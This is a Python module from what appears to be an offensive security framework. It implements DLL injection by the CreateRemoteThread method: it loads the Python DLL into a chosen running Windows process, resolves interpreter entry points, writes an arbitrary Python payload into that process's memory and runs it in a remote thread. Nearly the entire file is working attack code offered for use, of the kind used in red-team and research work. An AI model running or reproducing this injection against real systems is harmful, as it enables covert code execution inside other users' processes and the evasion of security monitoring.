import ctypes
import os
import sys

from modules.windows.injection.dll_injection2 import BoomerModule as DLLInjectionModule


class BoomerModule(DLLInjectionModule):
    kernel32 = ctypes.windll.kernel32
    python_payload = None

    def __init__(self):
        info = {
            "Name": "DLL Injection - CreateRemoteThread Method",
            "Author": "Antonio Marcos",
            "Description": "Run python code in a thread loaded at a running process."
        }
        options = {
            "pid": ["Target PID to inject dll", None, False],
            "process_name": ["Process name to inject dll", None, False],
            "py_payload": ["Python payload to run", None, False],
            "py_payload_path": ["Path of the script that contains the payload", None, False],
        }
        super(BoomerModule, self).__init__(options, info)

    def run(self):
        # Running pid initialization of the parent
        validation_message = self.initial_validation()
        if validation_message is not None:
            self.print_error(validation_message)
            return

        # Initialization of variables
        self.pid_initialization()
        self.python_payload = self.load_python_payload()

        if self.python_payload is None:
            self.print_error("There was an error getting the python payload. The injection won't continue.")

        # Generating python dll name (depends of the version)
        python_lib = "python{0}{1}.dll".format(sys.version_info.major, sys.version_info.minor)

        # Injecting python dll into the process
        if not self.inject_dll(python_lib):
            return

        self.run_payload(python_lib)

        # Closing process handle
        self.close_process_handle()

    def run_payload(self, python_lib):
        # Getting handle of injected dll
        local_handle = self.kernel32.GetModuleHandleW(python_lib)

        # Getting the address of the DLL function Py_InitializeEx
        py_initialize_ex = self.dll_handle + (
                self.kernel32.GetProcAddress(local_handle, b'Py_InitializeEx\x00') - local_handle)

        # Getting the address of the DLL function PyRun_SimpleString
        py_run_simple_string = self.dll_handle + (
                self.kernel32.GetProcAddress(local_handle, b'PyRun_SimpleString\x00') - local_handle)
        self.print_info('Resolved addresses:')
        self.print_info("  - Py_InitializeEx:    0x{0:08x}".format(py_initialize_ex))
        self.print_info("  - PyRun_SimpleString: 0x{0:08x}".format(py_run_simple_string))

        # Creating new thread where we initialize the python interpreter
        thread_h = self.process_handle.start_thread(py_initialize_ex, 0)
        # Joining new thread handle to the process
        self.process_handle.join_thread(thread_h)

        # Allocating space to write in the process memory the payload
        python_payload_addr = self.process_handle.allocate(size=len(self.python_payload),
                                                           permissions='PAGE_READWRITE')
        # Writing payload into process memory
        self.process_handle.write_memory(python_payload_addr, self.python_payload)

        # Starting the thread that will run the payload
        thread2_h = self.process_handle.start_thread(py_run_simple_string, python_payload_addr)
        # Joining thread handle to the process
        self.process_handle.join_thread(thread2_h)

        self.print_ok("Thread joined to the process successfully!!")

    def initial_validation(self):
        result = super(BoomerModule, self).initial_validation()

        if result is None and not self.payload_validation():
            return "It's mandatory to specify a python payload or the path where the payload is"

        return result

    def payload_validation(self):
        option_py_payload = self.options.get("py_payload")[1]
        option_py_payload_path = self.options.get("py_payload_path")[1]
        return (
                option_py_payload is not None
                and option_py_payload != ""
                or option_py_payload_path is not None
                and option_py_payload_path != ""
        )

    def load_python_payload(self):
        result = None
        option_py_payload = self.options.get("py_payload")[1]
        option_py_payload_path = self.options.get("py_payload_path")[1]

        if (option_py_payload == None or option_py_payload == ""):
            result = self.load_python_payload_from_path(option_py_payload_path)
        else:
            result = option_py_payload

        return result

    def load_python_payload_from_path(self, option_py_payload_path):
        result = None

        if option_py_payload_path != None and option_py_payload_path != "" and not os.path.isfile(
                option_py_payload_path):
            self.print_error(
                f"The path: {option_py_payload_path} doesn't exists in the system"
            )
            return result

        with open(option_py_payload_path, 'r') as myfile:
            result = myfile.read()

        if result == "":
            result = None

        return result
